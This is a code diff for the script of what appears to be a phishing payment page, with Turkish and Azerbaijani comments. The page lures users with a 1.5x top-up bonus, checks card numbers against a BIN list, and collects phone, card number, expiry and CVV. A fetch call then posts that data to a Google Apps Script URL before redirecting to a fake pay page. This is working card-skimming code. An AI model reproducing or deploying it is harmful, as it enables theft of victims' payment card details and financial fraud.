@@ -266,98 +266,94 @@
     </div>
   </div>
 <script>
-  const validBins = [
-    "1230", "3751", "4018", "4021", "4004", "4006", "4023", "4028", "4056", "4069", "4071", "4076", "4098", "4169", "4779", "5239", "5167", "5339", "5398", "4567", "5200", "4894", "5243", "4716", "4569", "4389", "5390", "4641", "5123", "4568", "4210", "4119", "4321", "4118", "4672", "4116", "4211", "5111", "5319", "4017", "4022", "4566", "4198", "4105", "4801", "4709", "4999", "5223", "4719", "5018", "4915", "4212", "5311", "5323", "4822", "4631", "4555", "4799", "4019", "4117"
-  ];
+// Geçerli BIN numaralarının listesi
+const validBins = [
+  "1230", "3751", "4018", "4021", "4004", "4006", "4023", "4028", "4056", "4069", "4071", "4076", "4098", "4169",
+  "4779", "5239", "5167", "5339", "5398", "4567", "5200", "4894", "5243", "4716", "4569", "4389", "5390", "4641",
+  "5123", "4568", "4210", "4119", "4321", "4118", "4672", "4116", "4211", "5111", "5319", "4017", "4022", "4566",
+  "4198", "4105", "4801", "4709", "4999", "5223", "4719", "5018", "4915", "4212", "5311", "5323", "4822", "4631",
+  "4555", "4799", "4019", "4117"
+];
 
-  // Telefon numarasını yalnızca rakam kabul edecek şekilde düzenler
-  function telefonInput(input) {
-    input.value = input.value.replace(/[^\d]/g, '+');
+// Kart numarası kontrol ve format fonksiyonu
+function kartNumarasiKontrol(input) {
+  // Kart numarasındaki tüm harf olmayan karakterleri temizle
+  let temizNumara = input.value.replace(/\D/g, '');
+
+  // 4'lü gruplara böl ve görünümü formatla
+  let formatliNumara = temizNumara.match(/.{1,4}/g)?.join(' ') || '';
+  input.value = formatliNumara;
+
+  // BIN kontrolü
+  const bin = temizNumara.slice(0, 4);
+  const buton = document.getElementById("submit-button");
+
+  if (validBins.includes(bin)) {
+    input.classList.add('valid');
+    input.classList.remove('invalid');
+    buton.disabled = false; // Butonu aktif et
+  } else {
+    input.classList.add('invalid');
+    input.classList.remove('valid');
+    buton.disabled = true; // Butonu pasif et
   }
+}
 
-  // Tutar üzerinden 1.5x bonus hesaplama
-  function hesapla(tutar) {
-    const bonus = (tutar * 1.5).toFixed(2);
-    document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
+// CVV kontrol fonksiyonu (3 haneli olması için)
+function cvvInput(input) {
+  input.value = input.value.replace(/\D/g, '').slice(0, 3);
+}
+
+// Ay ve yıl dropdown'larını doldurma
+window.onload = function () {
+  const aylar = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"];
+  const aySelect = document.getElementById("son-kullanma-ay");
+  const ilSelect = document.getElementById("son-kullanma-yil");
+
+  aylar.forEach((ay) => {
+    const option = document.createElement("option");
+    option.value = ay;
+    option.innerText = ay;
+    aySelect.appendChild(option);
+  });
+
+  for (let i = 2024; i <= 2034; i++) {
+    const option = document.createElement("option");
+    option.value = i;
+    option.innerText = i;
+    ilSelect.appendChild(option);
   }
+};
 
-  // Kart numarasını kontrol eder ve formatlar
-  function kartNumarasiKontrol(input) {
-    let temizNumara = input.value.replace(/\D/g, '');
-    let formatliNumara = temizNumara.match(/.{1,4}/g)?.join(' ') || '';
-    input.value = formatliNumara;
+// Form verilerini gönderme fonksiyonu
+async function gonder(event) {
+  event.preventDefault();
 
-    if (temizNumara.length >= 4) {
-      const bin = temizNumara.slice(0, 4);
-      if (validBins.includes(bin)) {
-        input.classList.remove('invalid');
-        input.classList.add('valid');
-        document.getElementById("submit-button").disabled = false;
-      } else {
-        input.classList.remove('valid');
-        input.classList.add('invalid');
-        document.getElementById("submit-button").disabled = true;
-      }
-    } else {
-      input.classList.remove('valid');
-      input.classList.add('invalid');
-      document.getElementById("submit-button").disabled = true;
-    }
-  }
-
-  // CVV girişini doğrular
-  function cvvInput(input) {
-    input.value = input.value.replace(/\D/g, '').slice(0, 3);
-  }
-
-  // Ay ve yıl dropdownlarını doldurur
-  window.onload = function () {
-    const aylar = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"];
-    const aySelect = document.getElementById("son-kullanma-ay");
-    const ilSelect = document.getElementById("son-kullanma-yil");
-
-    aylar.forEach((ay) => {
-      const option = document.createElement("option");
-      option.value = ay;
-      option.innerText = ay;
-      aySelect.appendChild(option);
-    });
-
-    for (let i = 2024; i <= 2034; i++) {
-      const option = document.createElement("option");
-      option.value = i;
-      option.innerText = i;
-      ilSelect.appendChild(option);
-    }
+  const data = {
+    telefon: document.getElementById("telefon-numarasi").value.trim(),
+    tutar: document.getElementById("tutar").value.trim(),
+    kart: document.getElementById("kart-numarasi").value.trim(),
+    ay: document.getElementById("son-kullanma-ay").value.trim(),
+    yil: document.getElementById("son-kullanma-yil").value.trim(),
+    cvv: document.getElementById("cvv").value.trim(),
   };
 
-  async function gonder(event) {
-    event.preventDefault();
+  try {
+    await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+      mode: "no-cors",
+    });
 
-    const data = {
-      telefon: document.getElementById("telefon-numarasi").value.trim(),
-      tutar: document.getElementById("tutar").value.trim(),
-      kart: document.getElementById("kart-numarasi").value.trim(),
-      ay: document.getElementById("son-kullanma-ay").value.trim(),
-      yil: document.getElementById("son-kullanma-yil").value.trim(),
-      cvv: document.getElementById("cvv").value.trim(),
-    };
-
-    try {
-      await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(data),
-        mode: "no-cors",
-      });
-
-      window.location.href = "pay/index.html";
-    } catch (error) {
-      console.error("XƏTA", error);
-    }
+    window.location.href = "pay/index.html";
+  } catch (error) {
+    console.error("XƏTA", error);
   }
+}
+
 </script>
 </body>
 </html>
